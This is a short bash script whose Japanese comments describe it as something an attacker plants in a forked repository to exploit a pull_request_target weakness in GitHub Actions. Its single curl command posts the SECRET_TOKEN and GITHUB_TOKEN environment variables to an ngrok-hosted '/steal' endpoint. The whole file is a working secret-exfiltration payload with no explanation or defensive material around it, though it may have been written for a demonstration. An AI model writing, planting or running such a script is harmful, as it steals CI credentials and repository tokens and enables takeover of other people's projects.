#!/bin/bash
# 攻撃者がフォークに仕込むスクリプト
# pull_request_target の脆弱性を利用してシークレットを外部サーバーに送信する

curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
